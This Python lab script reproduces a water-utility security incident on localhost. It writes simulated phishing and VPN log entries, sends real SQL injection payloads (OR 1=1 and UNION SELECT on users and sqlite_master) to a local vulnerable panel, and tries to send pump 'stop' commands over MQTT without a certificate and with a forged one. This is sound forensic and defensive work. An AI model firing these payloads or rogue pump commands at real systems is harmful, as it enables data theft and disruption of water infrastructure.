"""Reproducao em LAB do INC-VA-0712. Eventos marcados synthetic=true NAO foram capturados de sistemas reais (Gophish/WireGuard nao rodaram neste ambiente);
os demais (SQLi no painel vulneravel, rejeicao TLS no broker) sao capturas reais. Alvo: apenas 127.0.0.1."""
import json, os, subprocess, sys, time, urllib.parse, urllib.request, urllib.error
H = os.path.abspath(os.path.join(os.path.dirname(__file__), "..")); L = f"{H}/forensics/lab_logs"; os.makedirs(L, exist_ok=True)
for f in os.listdir(L): os.remove(f"{L}/{f}")
def w(f, **k): open(f"{L}/{f}", "a").write(json.dumps({"ts": time.time(), **k}) + "\n")
ATK = "203.0.113.50"                                                   # IP do atacante (faixa de documentacao RFC 5737)
w("gophish.jsonl", event="email_sent", to="coord.fake@vilaaurora.example", subject="Atualizacao obrigatoria do acesso ao painel", synthetic=True, note="conteudo gerado por IA (simulado); conta ficticia"); time.sleep(1.2)
w("gophish.jsonl", event="link_clicked", to="coord.fake@vilaaurora.example", ip=ATK, synthetic=True); time.sleep(1.0)
w("gophish.jsonl", event="credentials_submitted", to="coord.fake@vilaaurora.example", ip=ATK, synthetic=True, note="credencial FICTICIA; senha nao registrada"); time.sleep(1.0)
w("vpn.jsonl", event="vpn_login", user="coord.fake", src_ip=ATK, mfa=False, method="password", synthetic=True, note="VPN legada: apenas senha"); time.sleep(1.0)
os.environ["PANEL_URL"] = "http://127.0.0.1:5001"
open("/tmp/web_vuln.log", "w").close()
for p in ["'", "x' OR 1=1 --", "zzz' UNION SELECT email, nome, cpf_sintetico, role FROM users --", "zzz' UNION SELECT name, sql, '', '' FROM sqlite_master --"]:
    try: urllib.request.urlopen("http://127.0.0.1:5001/historico?busca=" + urllib.parse.quote(p), timeout=5).read()
    except urllib.error.HTTPError: pass
    time.sleep(0.6)
os.system(f"cp /tmp/web_vuln.log {L}/web_painel_vuln.jsonl")           # captura REAL do log web do painel
w("painel_audit.jsonl", event="pump_schedule_change", actor="coord.fake(via-vpn)", device="bomba-escola", action="schedule: 02:30 OFF", synthetic=True, note="painel de lab nao tem agendamento; registro simulado"); time.sleep(1.0)
P = f"{H}/pki/out"; mark = os.path.getsize(f"{H}/edge/data/mosquitto.log")
subprocess.run(["mosquitto_pub", "-h", "127.0.0.1", "-p", "8883", "--cafile", f"{P}/ca.crt", "-t", "vila/cmd/bomba-escola", "-m", '{"action":"stop"}'], capture_output=True)   # sem cert
subprocess.run(["mosquitto_pub", "-h", "127.0.0.1", "-p", "8883", "--cafile", f"{P}/ca.crt", "--cert", "/tmp/rogue.crt", "--key", "/tmp/rogue.key", "-t", "vila/cmd/bomba-escola", "-m", '{"action":"stop"}'], capture_output=True)  # cert forjado
time.sleep(1)
with open(f"{H}/edge/data/mosquitto.log", "rb") as f: f.seek(mark); open(f"{L}/mosquitto_trecho.log", "wb").write(f.read())   # captura REAL do broker
print("reproducao concluida:", sorted(os.listdir(L)))
